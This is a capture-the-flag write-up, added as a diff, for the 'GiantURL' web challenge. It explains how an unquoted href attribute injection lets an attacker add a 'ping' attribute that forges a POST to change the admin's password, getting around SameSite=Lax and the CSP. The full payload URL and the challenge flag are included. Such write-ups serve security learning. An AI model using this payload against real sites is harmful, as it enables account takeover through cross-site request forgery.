@@ -1,0 +1,40 @@
+<h1>GiantURL</h1>
+
+<p>We have a website where we can:
+- create <code>redirect</code> URL <code>GET /redirect</code>
+- change admin's password <code>POST /admin/changepass</code>
+- report URL <code>POST /report</code></p>
+
+<p>The website is not protected by any CSRF tokens but the <code>SameSite=Lax</code> cookie is set so we can't do any <code>POST</code> requests across different origins.</p>
+
+<p><code>php
+&lt;?php
+if ($path === '/admin/changepass' &amp;&amp; $_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_SESSION["admin"] === "true") {
+    if (strlen($_REQUEST['password']) &gt;= 100 &amp;&amp; count(array_unique(str_split($_REQUEST['password']))) &gt; 10) {
+        $password = $_REQUEST['password'];
+        echo 'Successfully changed password.';
+    } else {
+        echo 'Password is insecure.';
+    }
+}
+file_put_contents("password", $password);
+?&gt;
+</code></p>
+
+<p>In order to get the flag we have to somehow change the admin's password. We can see that it must be a <code>POST</code> request but the <code>password</code> can be passed as a URL parameter.</p>
+
+<p>In the <code>/redirect</code> we have a vulnerable code:
+<code>php
+Click on &lt;a href=&lt;?php echo htmlspecialchars($_REQUEST['url']); ?&gt;&gt;this link&lt;/a&gt; to go to your page!
+</code></p>
+
+<p>In theory we could insert the xss there, like for example: <code>&lt;a href=aa onclick=alert()&gt;this link&lt;/a&gt;</code> but CSP will block such attempts because of the
+<code>Content-Security-Policy: default-src 'self'; style-src 'unsafe-inline';</code> header.</p>
+
+<p>However, there is a <code>ping</code> feature in <code>&lt;a&gt;</code> elements that sends a <code>POST</code> request when the link was clicked. So we can insert <code>&lt;a href=aa ping="/admin/changepass?password=LONG_PASSWORD"&gt;this link&lt;/a&gt;</code> in the <code>/redirect</code> and then when the admin clicks on that URL their password will change. The full payload:
+<code>
+https://giant_url.2019.chall.actf.co/redirect?url=aa%20ping=/admin/changepass?password=0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a
+</code></p>
+
+<p>After that we can log in using the new credentials and we get the flag: 
+<strong>actf{p1ng<em>p0ng</em>9b05891fa9c3bed74d02a349877b1c60}</strong></p>
